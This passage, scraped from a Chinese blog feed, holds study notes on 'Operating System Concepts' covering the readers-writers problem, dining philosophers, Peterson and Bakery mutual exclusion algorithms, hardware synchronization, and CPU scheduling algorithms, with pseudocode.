一个数据库可以被多个并发进程共享，有的进程只需要读数据库，而有的进程需要读或写数据库。将只需要读权限的进程称为 读者（Reader） ，需要写权限的进程称为 写者（Writer） 。如果一个写者和其它进程（无论读写）同时访问共享对象，则可能导致混乱。 有多种优先级方案： 第一读者-写者问题 ：读者优先，如果当前获得数据库权限的是读者进程，则其它读者进程无需等待，读者进程只有在当前操作数据库的进程是写者的情况下才需要阻塞。 第二读者-写者问题 ：写者优先，任何在等待获取数据库权限的写者进程都将比其它正在等待的读者进程先获得权限。 第三读者-写者问题 ：前两种策略都会导致写者或者读者的饥饿，此策略将保证没有任何进程会被无限阻塞。 读者-写者问题在以下情况非常有效： 当进程可以按照对共享对象所需的读写权限划分时 当读者进程数比写者进程数多时：因为读写锁的建立开销比信号量或互斥锁要大，此开销可通过允许多个读者并发来弥补 第一读者-写者问题 读优先，只要当前有读者在操作对象，所有读者都可以加入操作而不必等待。 进程共享如下数据： semaphore mutex, wrt：二者均初始化为 1，信号量 wrt 用作读写进程的互斥锁，信号量 mutex 则用于确保更新变量 readcount 时互斥。 int readcount：跟踪当前有多少个进程正在读对象，初始化为 0。 写者-读者进程结构如下，代码来自原书（英文版）第 206 页。 1234567891011121314151617181920212223// 写者do &#123; wait(wrt); // 执行写操作 signal(wrt);&#125; while(TRUE);// 读者do &#123; wait(mutex); readcount++; if (readcount == 1) // 若此读进程为等待的第一个读者，则需要先获取对象的权限 wait(wrt); signal(mutex); // 执行读操作 wait(mutex); readcount--; if (readcount == 0) // 若此读进程为最后一个离开的读者，则需要释放对象权限 signal(wrt); signal(mutex);&#125; while(TRUE); 第二读者-写者问题 写优先，只要当前有写者在操作对象，所有写者都将排队等待，中间不允许读者插入。只有所有写者完成处理后，读者才有机会访问。 进程之间共享如下数据： int readcount, writecount：readcount 记录当前正在等待读对象的读者数量，writecount 记录当前正在等待写对象的写者数量，均初始化为 0。 semaphore rmutex, wmutex：确保更新变量 readcount 和 writecount 时的互斥，均初始化为 1。 semaphore readTry：readTry 信号量用于声明有读者加入等待队列，确保读者和写者之间的互斥，初始化为 1。 semaphore resource：resource 信号量用于确保写者和写者之间的互斥，初始化为 1。 读者-写者结构如下，基本算法来自维基百科。 1234567891011121314151617181920212223242526272829303132333435363738394041// 读者do&#123; wait(readTry); // 读者必须在当前没有写者在操作对象时才可进入等待 // 保证了写优先 wait(rmutex); readcount++; if (readcount == 1) // 第一个读者需要获取资源权限 wait(resource); signal(rmutex); signal(readTry); // 临界区 wait(rmutex); readcount--; if (readcount == 0) // 最后一个离开的读者需要释放资源权限 signal(resource); signal(rmutex);&#125; while(TRUE);// 写者do &#123; wait(wmutex); writecount++; if (writecount == 1) // 第一个写者需要禁止其他读者进入等待 wait(readTry); signal(wmutex); // 进入临界区 wait(resource); // 写操作 signal(resource); // 离开临界区 wait(wmutex); writecount--; if (writecount == 0) // 最后一个离开的写者需要释放资源权限 signal(readTry); signal(wmutex);&#125; while(TRUE); 第三读者-写者问题 保证读者和写者均不会出现饥饿现象。 进程之间共享的信号量有： int readCount：当前正在访问对象的读者数量 Semaphore resourceAccess：资源的控制权限，使读者、写者互斥，初始化为 1 Semaphore readCountAccess：保证对 readCount 操作的互斥，初始化为 1 Semaphore serviceQueue：保持请求的顺序，维护先进先出特性，初始化为 1 读者-写者结构如下，基本算法来自维基百科。可能有多个进程在服务队列中等待，当前进入临界区的进程离开后，等待的进程就会接替离开的进程。当 serviceQueue 中阻塞了多个进程时，选择进程唤醒的顺序取决于信号量的链表，因此 serviceQueue 的链表必须维持 FIFO 特性才能保证不会导致饥饿 。因此，解决饥饿问题实际是由链表的 FIFO 带来的。另一个值得注意的地方是，无论写者还是读者，获得了服务队列的权限后，在获取资源控制权前都将禁止其他任何进程接受服务，而因为只有紧随写者进程的读者才需要获取资源权限，所以在此算法中读者可以同时并发访问。 1234567891011121314151617181920212223242526272829// 读者do &#123; wait(serviceQueue); // 在服务队列中等待 wait(readCountAccess); if (readCount == 0) // 第一个读者要从写者手中接管资源 wait(resourceAccess); readCount++; signal(serviceQueue); // 允许下一个进程进入服务队列等待 signal(readCountAccess); // 临界区 wait(readCountAccess); readCount--; if (readCount == 0) // 最后一个离开的读者要释放资源权限 signal(resourceAccess); signal(readCountAccess);&#125; while(TRUE);// 写者do &#123; wait(serviceQueue); wait(resourceAccess); signal(serviceQueue); // 临界区 signal(resourceAccess);&#125; while(TRUE); 哲学家进餐问题 问题描述：假设有 5 个哲学家共用一个圆桌，每人左右两边各有一根筷子，哲学家之间不互相交流。当哲学家感到饥饿时会依次拿起自己身边的筷子（一次只能拿起一根筷子、不能从其它哲学家手中拿筷子），当哲学家同时拥有两根筷子时可以开始进餐，否则将等待空闲的筷子（且并不放下已握在手中的筷子），吃完后他将放下两只筷子。 一种简单方法是每根筷子使用一个信号量，哲学家通过 wait() 请求相应的筷子，通过 signal() 释放相应的筷子。 1234567do&#123; wait(chopstick[i]); wait(chopstick[(i+1)%5]); // 进餐 signal(chopstick[i]); signal(chopstick[(i+1)%5]);&#125; while(TRUE); 上面的算法解决了筷子的互斥问题，但可能导致死锁。若五个哲学家同时拿起同一边的筷子，则所有人都将永远等待。可行的解决方法有： 最多只允许四个哲学家同时坐在桌上 只有两只筷子都可用时才允许一个哲学家拿起筷子，且拿起两只筷子的操作在临界区内进行 编号为奇数的哲学家先拿起左边的筷子再拿起右边的筷子，编号为偶数的哲学家先拿起右边的筷子再拿起左边的筷子 Dijkstra解法：每个哲学家都先拿起身边编号较小的筷子，再拿起编号较高的筷子 使用 Dijkstra 解法的哲学家就餐问题解法如下，伪代码根据维基百科的算法描述编写。 1234567891011121314void philosopher()&#123; leftChopstickIndex = index; // 左侧筷子编号为哲学家编号 rightChopstickIndex = (index + 1) % Philosophers; firstIndex = min(leftChopstickIndex, rightChopstickIndex); secondIndex = max(leftChopstickIndex, rightChopstickIndex); do&#123; wait(chopstick[firstIndex]); wait(chopstick[secondIndex]); // 进餐 signal(chopstick[firstIndex]); signal(chopstick[secondIndex]); // 释放资源的顺序可随意 &#125; while(TRUE);&#125; 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（四）：进程互斥此专栏的下一篇文章：操作系统（六）：管程（Monitor） 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/24/os-concepts-5/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（四）：进程互斥","slug":"os-concepts-4","date":"2016-11-24T07:29:44.000Z","updated":"2017-03-06T10:59:44.000Z","comments":true,"path":"2016/11/24/os-concepts-4/","link":"","permalink":"http://forec.github.io/2016/11/24/os-concepts-4/","excerpt":"整理《Operating System Concepts》 第七版第六章进程互斥部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第六章进程互斥部分的理论和概念，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 生产者-消费者冲突模型 生产者-消费者（producer-consumer） 问题：生产者进程产生用来被消费者进程消耗的数据，例如一个编译器产生汇编代码，此代码交由汇编器生成对象。生产者、消费者进程之间可通过共享内存来传递数据，可分为： 无限缓冲（unbounded buffer） ：共享内存大小没有限制，当缓冲区为空时，消费者进程需要等待；生产者进程在任何时候都可以直接向缓冲区中投放数据而无需等待 有限缓冲（bounded buffer） ：内存共享的缓冲区域大小固定，若缓冲区为空则消费者进程需要等待；若缓冲区已满则生产者进程需要等待。 雏形 采用共享内存、有限缓冲的生产者消费者代码如下（原书 99 页第三章初次介绍共享内存模型时的代码）。共享缓冲通过循环数组和两个逻辑指针 in、out 实现，变量 in 指向缓冲中下一个空位，out 指向缓冲中的下一个待取走的数据位，(in+1)%BUFFER_SIZE == out 时缓冲区满。 1234567891011121314151617181920212223#define BUFFER_SIZE 10typedef struct&#123; ...&#125; item;item buffer[BUFFER_SIZE];int in = 0;int out = 0;// produceritem nextProduced;while (true)&#123; while (((in + 1) % BUFFER_SIZE) == out) ; buffer[in] = nextProduced; in = (in + 1) % BUFFER_SIZE;&#125;// consumeritem nextConsumed;while (true)&#123; while (in == out) ; nextConsumed = buffer[out]; out = (out+1) % BUFFER_SIZE;&#125; 上面的代码存在缺陷，生产者、消费者进程能够使用的最大缓冲区为 BUFFER_SIZE - 1，并且代码也没有解决生产者、消费者进程同时访问共享内存的问题。 改进 为使进程能够使用全部缓冲区，使用一个初始化为 0 的整数变量 counter 记录当前缓冲区中的元素数量；每当生产者向缓冲区投放数据，counter 递增；当消费者从缓冲区取走数据，counter 递减。可修改上面代码如下： 123456789101112131415// producerwhile (true)&#123; while (counter == BUFFER_SIZE) ; buffer[in] = nextProduced; in = (in+1) % BUFFER_SIZE; counter ++;&#125;// consumerwhile (true)&#123; while (counter == 0) ; nextConsumed = buffuer[out]; out = (out+1) % BUFFER_SIZE; counter --;&#125; 以上代码可使用全部缓冲区资源，但当消费者进程和生产者进程并发执行时，涉及修改 counter 的语句执行顺序将由操作系统设定。由于 C 语言中 counter++ 将被拆分为 mov register, counter、inc register 和 mov counter, register 三句汇编指令，假设由于操作系统的调度，当前消费者进程和生产者进程分别执行到 counter++ 和 counter-- 的最后一条汇编指令处，则 counter 的值将不正确。 竞争条件（race condition） ：多个进程同时访问和操作一个相同的数据，且执行结果和访问的特定顺序有关。 进程同步（process synchronization） 和 协调（coordination） ：确保系统不同部分操作资源不会互相影响。 临界区 系统中有 n 个进程{P0, P1, ..., Pn-1}，每个进程有一个代码段称为 临界区（critical section） ，在该区域中，不同的进程可能会改变相同的数据。临界区中应当最多同时存在一个进程。 临界区问题 指设计一个使进程协作的协议： 每个进程需先请求进入临界区（请求的代码称为 进入区，entry section ）； 获得允许，进入临界区执行 退出临界区（ 退出区，exit section ） 执行剩余代码（ 剩余区，remainder section ） 临界区问题的解决必须满足如下三个要求： 互斥（mutual exclusion） ：若进程 Pi 正在其临界区内，则其他进程都不能在临界区中执行 发展（前进，progress） ：如果当前没有进程在临界区内，并且有一些进程在请求进入临界区，则只有不处在剩余区的进程可以参与到选择（选择哪个进程进入临界区）中。这个选择不能被无限期推迟，即必须立刻作出决定。简单的说， 进入临界区请求的选择不应当受当前在剩余区执行进程的影响 。 有限等待（bounded waiting） ：从一个进程发出进入临界区请求，到该请求被允许，这期间只能有有限的其它进程进入临界区。即保证了每个进程都有机会进入临界区而不会饥饿。 假定每个进程的执行速度都不为 0，但是不能对 n 个进程的 相对速度（relative speed） 做任何假设。 操作系统内部的临界区问题：操作系统内同一时刻可能有多个处于内核模式的活动进程，有两种方法解决。 抢占内核（preemptive kernel） ：允许处于内核模式的进程被抢占。此模式可能导致竞争条件，在对称多处理器体系中，此模式更难设计。但此模式适合实时编程，响应更快（Linux 2.6之后内核和 Solaris、IRIX 均为抢占内核）。 非抢占内核（nonpreemptive kernel） ：不允许处于内核模式的进程被抢占，处于内核模式的进程会一直运行，直到其退出内核模式、阻塞或者自动释放对 CPU 的控制。这种方式根本不会导致竞争条件的产生。Windows XP、Windows 2000 和传统 UNIX 均为非抢占内核。 Peterson 算法 Peterson 算法 是对基于软件的临界区问题的经典解答，但由于现代计算机体系结构执行基本语言指令的不同方式，该算法在此类机器上不能正确执行。 Peterson 算法仅适用于两个进程（P0和P1），它们都在临界区和剩余区间交替执行。以下当使用 Pi 表示一个进程时，使用 Pj 表示另一个（j == 1-i）。 Peterson 算法需要在进程间共享两个数据项： int turn：指定哪个进程可以进入临界区，若 turn == i，则 Pi 被允许 boolean flag[2]：flag[i] 表示进程 i 已发出进入临界区请求 Peterson 算法中进程 Pi 的结构如下 12345678do &#123; flag[i] = TRUE; turn = j; while (flag[j] &amp;&amp; turn == j); // 临界区 flag[i] = FALSE; // 剩余区&#125; while (TRUE); Peterson 算法正确性的证明： 互斥：只有当 flag[j] == FALSE 或 turn == i 时 Pi 才进入临界区。假设 Pi 和 Pj 同时进入临界区，则 flag[0] == flag[1] == TRUE，因为 turn 只能为 0 或 1，所以只有一个进程（假设 turn == i）Pi 能够跳出 While 语句。此外，只要 Pi 在临界区内，flag[i] == TRUE &amp;&amp; turn == i 就始终成立，所以 Pi 在临界区执行期间，Pj 将始终等待或执行剩余区内容。 发展和有限等待：进程 Pi 仅在 flag[j] == True 且 turn == j 的情况下才会被阻塞，若 Pj 不准备进入临界区，则 flag[j] == False，此时 Pi 可以进入；若 Pj 当前也在请求进入临界区，则 flag[j] == True，此时由 turn 决定哪个进程进入临界区。假设此时 Pj 进入临界区，当 Pj 退出临界区时会设置 flag[j] 为 False 使 Pi 进入临界区；如果 Pj 剩余区执行速度非常快，又重新申请进入临界区，此时 Pj 设置 flag[j] 为 TRUE，同时 turn 被设置为 i。因此 Pi 一定会进入临界区（发展），并且最多需要等待一次。 Bakery 算法（补充） Bakery 算法适用于 n 个进程的临界区问题。 在进入临界区之前，进程需要申请一个号码，拥有最小号码的进程会被允许进入临界区。如果两个进程 Pi 和 Pj 申请到的号码相同（申请号码不是临界区，因此可能获得相同号码），则比较进程编号 i 和 j，编号小的先执行。 进程可申请到的号码始终是递增的。定义元组比较为 (a, b) &lt; (c, d) if a &lt; c || a == c &amp;&amp; b &lt; d，定义最大值函数 max(a0, a1, ..., an-1) 为 a0 ~ an-1 中的最大值。 Bakery 算法使用的共享数据有： boolean choosing[n]：choosing[i] == TRUE 表明进程 Pi 当前正在申请进入临界区或者正在临界区中执行 int number[n]：number[i] 为进程 Pi 当前申请到的号码 Bakery 算法流程如下 12345678910111213do &#123; choosing[i] = true; number[i] = max(number[0], number[1], ..., number[n-1])+1; choosing[i] = false; for (j = 0; j &lt; n; j++)&#123; // 此循环保证所有比当前进程持更高优先级的进程已离开临界区 while (choosing[j]); while (number[j] != 0 &amp;&amp; (number[j], j) &lt; (number[i], i)); &#125; // 临界区 number[i] = 0; // 剩余区&#125; while(1); Bakery 算法正确性证明： 首先，元组的大小比较和取号规则（只增）保证了全部进程都可维持一个严格递增的顺序，而不会出现两个进程地位相等的情况。 互斥：假设进程 Pi 已进入临界区，则 for 循环保证了，当前所有进程，号码比 Pi 的号码小的进程均已不在临界区，而号码比 Pi 大的进程将因为 number[i] != 0 而被阻塞在它们自己的 for 循环中，因此仅有 Pi 可进入临界区。互斥条件满足。 发展：假设一个进程 Pj 执行完临界区，则其进入剩余区之前将使 number[j] == 0，此时所有在等待进入临界区的进程中，按元组比较最小的那个进程将因为 number[j] == 0 而跳出 while 循环，此后它将跳过剩余的 for 循环（因为其它进程的元组均大于它）并进入临界区，而其它进程都将继续等待。因此在剩余区的进程（Pj）不会影响到进入临界区申请的选择。 有限等待：假设一个进程 Pi 已经申请到号码 number[i]，此时所有后申请进入临界区的进程 Pj 都会有 number[j] &gt; number[i]，且在 Pi 执行完临界区之前，Pj 都会因为 number[i] != 0 且 number[i] &lt; number[j] 而阻塞。因此进程 Pi 至多等待 n-1 个进程即可进入临界区。 硬件同步 无论软硬件方式，解决临界区问题都需要 锁（lock） ，所有解决方案都基于锁，且锁的设计可能非常复杂。进程在进入临界区之前获得锁，退出临界区时释放锁。 硬件特性可以简化编程并提高效率。现代计算机系统提供了特殊硬件指令以允许程序 原子（atomically） 检查和修改字地内容或交换两个字地内容。以下的 TestAndSet() 和 Swap() 函数均为原子操作，即硬件保证了它们作为一个完整过程执行而不会被抢占。它们的定义如下： 12345678910boolean TestAndSet(boolean *target)&#123; boolean rv = *target; *target = TRUE; return rv;&#125;void Swap(boolean *a, boolean *b)&#123; boolean temp = *a; *a = *b; *b = temp;&#125; 仅使用 TestAndSet() 或仅使用 Swap() 都可以解决互斥问题。以下是单独使用这二者实现的互斥，但均未满足有限等待的要求： 1234567891011121314151617// TestAndSet Lockdo &#123; while(TestAndSetLock(&amp;lock)); // 临界区 lock = FALSE; // 剩余区&#125; while(TRUE);// Swap Lockdo &#123; key = TRUE; while(key == TRUE) Swap(&amp;lock, &amp;key); // 临界区 lock = FALSE; // 剩余区&#125; while(TRUE); 使用 TestAndSet() 或 Swap() 也可以解决有限等待问题，以下是使用 TestAndSet() 实现的有限等待互斥，代码为进程 Pi 的结构，来自原书（英文版）第 199 页。可以看出，剩余区前的 while 循环保证一个进程 Pi 强制拉取了排在其后的进程 Pj 进入临界区（如果有的话），这保证了有限等待。使用到的共享数据有： boolean waiting[n]：waiting[i] == TRUE 表明进程 i 已申请进入临界区并正在等待选择 boolean lock：lock 是进程间共享的锁 12345678910111213141516do&#123; waiting[i] = TRUE; key = TRUE; while (waiting[i] &amp;&amp; key) // 进程排队 key = TestAndSet(&amp;lock); waiting[i] = FALSE; // 进程标注自己已进入临界区 // 临界区 j = (i+1) % n; while ((j != i) &amp;&amp; !waiting[j]) j = (j+1) % n; if (j == i) // 当前无其他进程排队则释放锁 lock = FALSE; else waiting[j] = FALSE; // 强制拉取后一个进程进入临界区 // 剩余区&#125; while(TRUE); 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（三）：CPU 调度此专栏的下一篇文章：操作系统（五）：进程同步 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/24/os-concepts-4/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（三）：CPU 调度","slug":"os-concepts-3","date":"2016-11-23T13:49:05.000Z","updated":"2017-01-06T11:38:52.000Z","comments":true,"path":"2016/11/23/os-concepts-3/","link":"","permalink":"http://forec.github.io/2016/11/23/os-concepts-3/","excerpt":"整理《Operating System Concepts》 第七版第五章（CPU 进程调度），内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第五章（CPU 进程调度），内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 概念 CPU 调度是多道程序操作系统的基础，在进程之间切换 CPU 可以提高计算机的吞吐率。 进程执行由 CPU 执行和 I/O 等待 周期（cycle） 组成，进程在这两个状态之间切换。进程执行从 CPU区间（CPU burst） 开始，之后在 CPU 区间和 I/O 区间 交换。 CPU 区间的长度随进程和计算机的不同而变化，通常具有大量短 CPU 区间和少量长 CPU 区间。I/O 约束（bound） 程序具有很多短 CPU 区间，CPU 约束程序具有更多的长 CPU 区间。 每当 CPU 空闲时，操作系统必须从就绪队列中选择一个能够执行的进程并为之分配 CPU。进程选择由 短期调度程序 或 CPU 调度程序执行。就绪队列不一定是先进先出（FIFO）队列，也可以被实现为优先队列、树、无序链表等。队列中的记录通常为进程控制块（PCB）。 在下面四种情况中，CPU 调度需要做出决策： 某个进程从运行状态切换到等待状态（如等待 I/O 或调用 wait 等待子进程） 某个进程终止 某个进程从运行状态切换到就绪状态（如出现中断） 某个进程从等待状态切换到就绪状态（如 I/O 完成） 在上面四种情况中，如果调度程序只在前两种情况发生时运行，则调度方案是 非抢占（nonpreemptive）调度 ，否则该调度方案是 抢占（preemptive）调度 。简单的说，非抢占调度指，一旦 CPU 被分配给一个进程，除非该进程终止或者切换到了等待状态，否则该进程不会释放分配的 CPU 资源，这部分 CPU 资源也无法被分配给其它进程；抢占调度指，分配给一个进程的 CPU 资源可能在该进程运行期间被重新分配给其他进程，此时这部分资源所属的原来的进程会被切换到就绪状态。 分派程序（dispatcher） 是一个用来将 CPU 控制权交付给由短期调度程序选择出的要执行的进程的模块。每次进程切换时都会调用分派程序，它应当尽可能快。分派程序停止一个进程并启动另一个要花费的时间称为 分派延迟（dispatch latency） 。它的功能包括： 切换上下文 切换到用户模式 跳转到用户程序的合适位置，以重新启动程序 调度算法 不同的 CPU 调度算法依据不同的属性来选择进程，可通过以下准则衡量调度算法的特点和优势： CPU 利用率（utilization）：调度算法应使 CPU 尽可能忙，40%（轻负荷）~90%（重负荷） 吞吐量（throughput）：一个时间单元内所完成的进程的数量，对于长、短进程，吞吐量也有所不同 周转时间（turnaround time） ：一个特定进程 从进程提交到进程完成所需的时间 ，该时间为所有时间段之和，包括等待载入内存、在就绪队列中等待、在 CPU 上执行和 I/O 等待时间 等待时间（waiting time） ：进程在 就绪队列 中等待所花费的时间之和 响应时间（response time） ：对交互系统而言需要考虑响应时间，该准则指的是从提交请求到产生第一响应的时间（开始响应所需要的时间，而不是输出响应所需要的时间） 需要使 CPU 利用率和吞吐量最大化，而周转时间、等待时间和响应时间最小化。多数情况下需要优化平均值，少数情况需要优化最小值或最大值。例如对于分时系统，为保证所有用户得到更好服务，需要尽可能使最大响应时间最小。 先到先服务 最简单的 CPU 调度算法是 先到先服务（first-come，first-served，FCFS） 调度算法：先请求 CPU 的进程先分配到 CPU，该算法可用 FIFO 队列实现，且平均等待时间通常较长。 当系统中存在一个 CPU 约束进程和多个 I/O 约束进程时，可能出现 CPU 约束进程占用 CPU，同时其他进程处理完 I/O 请求并在就绪队列中等待，此时 I/O 设备空闲。当 CPU 约束进程结束、转移到 I/O 区间后，这些 I/O 约束进程很快会执行完计算任务（仅有很短的 CPU 区间）并移回 I/O 区间，此时 CPU 空闲。之后该状态会反复，即多个进程等待一个长进程释放 CPU，此现象称为 护航效果（convoy effect） 。这将导致 CPU 和设备利用率变得更低。 FCFS 调度是非抢占的，因此不适合分时系统，允许一个进程保持过长的 CPU 时间是非常严重的错误。 最短作业优先 最短作业优先（shortest-job-first，SJF） 调度算法：当 CPU 空闲时，调度程序选择需要 CPU 区间最短的进程执行，如果有多个进程的下一次 CPU 区间长度相同，则在这些进程间使用 FCFS。即，先比较需要的 CPU 区间长度，长度越短优先级越高，长度相同时，到达时间越早优先级越高。 SJF 调度算法可证明为 最佳 的，对于给定的一组进程， SJF 算法的平均等待时间最小 。这一点的证明可以考虑贪心算法。 因为无法获知进程下个 CPU 区间的长度，一种替代方法是近似 SJF 调度，即通过先验长度 预测 下一个 CPU 区间长度。我们认为，下一个 CPU 区间长度与此前的相似，可视作此前 CPU 区间测量长度的 指数平均（exponential average） ：设 t_n 为某进程第 n 个 CPU 区间的长度，则该进程下一个 CPU 区间的预测值 τ_n+1 = αt_n + (1-α)τ_n，这里 0 ≤ α ≤ 1。τ_n代表着过去的历史，而 t_n 为最近的信息，参数 α 控制了最近和过去历史在预测中的相对加权。 SJF 算法可能是抢占的或非抢占的。对于抢占 SJF 调度算法，当一个新进程到达就绪队列且当前正在执行的进程剩余时间比新进程所需 CPU 时间长，则新进程抢占 CPU。抢占 SJF 调度也称为 最短剩余时间优先（shortest-remaining-time-first）调度 ，与之相反的，新进程始终等待原有进程运行结束的 SJF 调度为非抢占 SJF 调度。 优先级调度 SJF 实际是通用 优先级（priority）调度算法 的一个特例。每个进程与一个优先级关联，具有最高优先级的进程会被先分配，具有相同优先级的进程按 FCFS 顺序调度。SJF 算法属于简单优先级算法，其优先级为进程预测 CPU 区间的倒数，CPU 区间长度越大则优先级越小。 通常按照 高 优先级和 低 优先级讨论调度，优先级通常为某个固定区间的数字，如 0 ~ 7，对于不同的系统，0 可以是最高，也可以是最低优先级。 优先级调度算法可以是抢占的或者非抢占的，对于抢占的优先级调度算法，具有更高优先级的新到达进程会抢占 CPU。 主要问题： 无穷阻塞（indefinite blocking） 或 饥饿（starvation） ，此调度算法会导致低优先级进程无穷等待 CPU。 解决饥饿： 老化（aging） 技术可以逐渐增加在系统中等待时间过长的进程的优先级，即每过一段时间递减等待进程的优先级的值，最终低优先级的进程会成为高优先级的进程并得以执行。 动态优先级例题 ：假设某系统采用基于动态优先级的抢占式调度算法，且优先数越大的进程优先级越高，系统为所有新建进程赋予优先级值 0，当一个进程在就绪队列中等待 CPU 时，其优先级值变化速率为 α；当进程获得 CPU 并执行时，执行过程中优先级值变化速率为 β： 若 β &gt; α &gt; 0，则调度算法相当于：FCFS 若 α &lt; β &lt; 0，则调度算法相当于：FCLS 轮转法（RR） 轮转法（round-robin，RR） 调度算法是 专门为分时系统设计 的，类似 FCFS 调度，但强制通过抢占切换进程。该调度算法定义一个较小的 时间单元（time quantum） 或时间切片，通常在 10 ~ 100 ms之间。就绪队列是环形的，并保持 FIFO 性质， 新到达的进程会被添加到队列末尾 。调度算法从就绪队列的头部移出进程 A，为其分配 CPU 并执行，同时也会设置一个定时器，当进程 A 执行时间到达一个时间单元时，如果进程 A 仍未结束，则将被就绪队列的下一个进程 B 抢占，进程 A 再次被加入就绪队列。注意，因为就绪队列为环形链表，队列头指针现在已经跳转到进程 B，所以进程 A 已成为整个队列的最后一个进程。 使用 RR 策略调度的平均等待时间通常比较长。 RR 算法的性能很大程度上依赖时间单元的大小。考虑极端情况： 时间单元（时间片）非常大，则 RR 算法等价于 FCFS 算法 时间单元非常小，则 RR 算法称为 处理器共享（processor sharing） ，此时 n 个进程看起来就像运行在各自独立的 CPU 上，每个 CPU 的运行速度是真实 CPU 的 1/n。 通常希望 时间单元比上下文切换时间长 ，例如上下文切换时间为时间片的 10%，则约有 10% 的 CPU 时间浪费在上下文切换上。现代操作系统时间片通常为 10 ~ 100ms，而上下文切换时间通常少于 10μs。 周转时间依赖于时间片大小 ：若绝大多数进程能在一个时间单元内完成，则平均周转时间会改善。 根据经验，80% 的 CPU 区间应当小于时间片。 多级队列调度 在进程容易分组的情况下（如划分为 前台（交互） 进程和 后台（批处理） 进程），可使用 多级队列（multilevel queue）调度算法 。该算法将就绪队列划分为多个独立队列，进程按自身属性被 永久地 分配到一个队列，每个队列使用自己的调度算法。例如，前台队列可能使用 RR 算法（分时系统），而后台队列使用 FCFS 算法。 队列之间必须存在调度，通常采用 固定优先级抢占调度 。例如，前台队列要比后台队列具有绝对优先级。 举例：存在 4 个队列的多级队列调度算法，按优先级排列为：系统进程 &gt; 交互进程 &gt; 交互编辑进程 &gt; 批处理进程。队列之间存在绝对优先级，只有系统进程、交互进程、交互编辑进程队列均为空时，批处理队列内的进程才可运行；在批处理队列有进程运行时，更高优先级队列进入新进程会抢占批处理进程。 队列之间可划分时间片，每个队列有一定的 CPU 时间用于调度进程，例如前台队列可以将 80% 的 CPU 时间用于进程间的 RR 调度，后台队列可以有 20% 的 CPU 时间采用 FCFS 算法调度。 多级反馈队列调度 多级反馈队列（multilevel feedback queue）调度算法 允许进程在队列之间移动，根据不同 CPU 区间来区分进程。 如果进程使用过多 CPU 时间，则它会被转移到更低优先级队列。这种方法将 I/O 约束和交互进程留在更高优先级队列。 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列，这种老化阻止了饥饿的发生。 考虑如下的多级反馈队列调度程序，它包含三个队列（0~2），优先级从高到低，只有队列 0 空，队列 1、2 内的进程才可执行，到达队列 0 的进程可以抢占队列 1、2 的进程。进入就绪队列的进程被放入队列 0，队列 0 中每个进程有 8 ms 时间片，如果该进程不能在这个时间片内完成，则它将被移动到队列 1 的尾部；当队列 0 为空时，队列 1 的头部进程会得到一个 16 ms 的时间片，若该进程不能在此时间片内完成，则将被抢占并放置到队列 2 的尾部。 多级反馈队列调度程序由以下参数定义： 队列数量 每个队列各自的调度算法 何时升级到更高优先级队列 何时降级到更低优先级队列 进程在需要服务时应当进入哪个队列 多级反馈调度程序是最通用的 CPU 调度算法，但也最复杂。 高响应比优先（补充） 高响应比优先（highest response-ratio next，HRRN）算法 ：非抢占调度，响应比定义为 R = (W+T)/T = 1+W/T，其中 W 是某个进程在就绪队列中的等待时间，T 是该进程的 CPU 区间长度。 具有最高响应比的进程会被调度。HRRN 算法同时考虑了等待时间和 CPU 区间。 缺陷：为每个进程计算响应比需要消耗系统资源。 多处理器调度 存在多个 CPU 使 负载分配（load sharing） 成为可能，多处理器调度只考虑处理器同构的系统，并可以将任何处理器用于任何队列内的任何进程。 非对称多处理（asymmetric multiprocessing） ：使一个处理器（主服务器）处理所有的调度决定、I/O处理以及其他系统活动，其它处理器只执行用户代码 对称多处理（symmetric multiprocessing，SMP） ：每个处理器自我调度，所有进程可能处于一个共同的就绪队列，或每个处理器拥有自己的私有就绪队列。调度通过每个处理器检查共同就绪队列并选择一个进程执行。 处理器亲和性（processor affinity） ：多数 SMP 系统试图避免将进程从一个处理器移动到另一个处理器，而是努力让一个进程在同一个处理器上运行。一个操作系统使用策略使一个进程保持在同一个处理器上运行，但不能做任何保证时，称为 软亲和性（soft affinity） ；有的操作系统，如 Linux，提供一个支持 硬亲和性（hard affinity） 的系统调用保证了进程无法转移到其它处理器。 负载均衡（load balancing） 保证了所有处理器的工作负载平衡以完全利用多处理器的优点，它仅在每个 CPU 有私有就绪队列的情况下才有必要。它和处理器的亲和性相悖。有两种方法可实现： 推送迁移（push migration） ：一个特定的进程间歇性的检查每个处理器的负载，假如当前负载不均衡，则将过载处理器上进程推送到空闲处理器。 拉取迁移（pull migration） ：一个空闲处理器从一个忙处理器拉取一个处于等待状态的进程。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（二）：进程与线程此专栏的下一篇文章：操作系统（四）：进程互斥 参考资料：《操作系统概念 